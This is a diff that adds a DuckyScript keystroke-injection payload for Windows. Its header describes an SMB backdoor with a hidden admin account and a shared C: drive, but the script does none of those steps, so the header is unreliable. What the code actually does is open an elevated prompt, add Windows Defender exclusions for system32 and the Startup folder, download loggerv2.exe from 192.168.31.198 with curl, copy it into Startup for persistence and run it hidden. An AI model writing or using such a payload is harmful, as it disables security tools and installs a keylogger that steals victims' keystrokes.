@@ -1,0 +1,67 @@
+REM #
+REM # Title:            "Microsoft Windows" SMB Backdoor
+REM #
+REM # Description:      
+REM #                   1) Adds a user account (RD_User:RD_P@ssW0rD).
+REM #                   2) Adds this local user to local administrator group.
+REM #                   3) Shares "C:" directory (RD_SHARE).
+REM #                   4) Adds a rule to the firewall.
+REM #                   5) Sets a value to "LocalAccountTokenFilterPolicy" to access the "C:" with a local account.
+REM #                   6) Hides this user account.
+REM #
+REM # Author:           f1ch3u5
+REM # Version:          1.0
+REM # Category:         Keylogger
+REM # Target:           Microsoft Windows
+REM #
+REM #
+REM # REQUIREMENTS
+REM # ===============
+REM # The target user must belong to the 'Administrators' group.
+REM #
+
+REM ######## INITIALIZATION ########
+
+DELAY 2000
+
+REM ######## STAGE1 ########
+
+GUI r
+DELAY 2000
+STRING cmd
+DELAY 2000
+CTRL-SHIFT ENTER
+DELAY 1500
+LEFTARROW
+DELAY 1500
+ENTER
+DELAY 2000
+
+REM ######## STAGE2 ########
+STRING powershell Add-MpPreference -ExclusionPath "C:\Windows\system32"
+ENTER
+DELAY 3000
+
+REM ######## STAGE2 ########
+STRING powershell Add-MpPreference -ExclusionPath "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+ENTER
+DELAY 3000
+
+STRING curl -o loggerv2.exe 192.168.31.198/loggerv2.txt
+ENTER
+DELAY 2000
+
+REM ######## STAGE3 ########
+
+STRING copy loggerv2.exe "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+ENTER
+DELAY 2000
+REM ######## STAGE4 ########
+
+STRING start /B loggerv2.exe
+ENTER
+DELAY 1500
+
+REM ######## FINISH ########
+
+ALT-F4
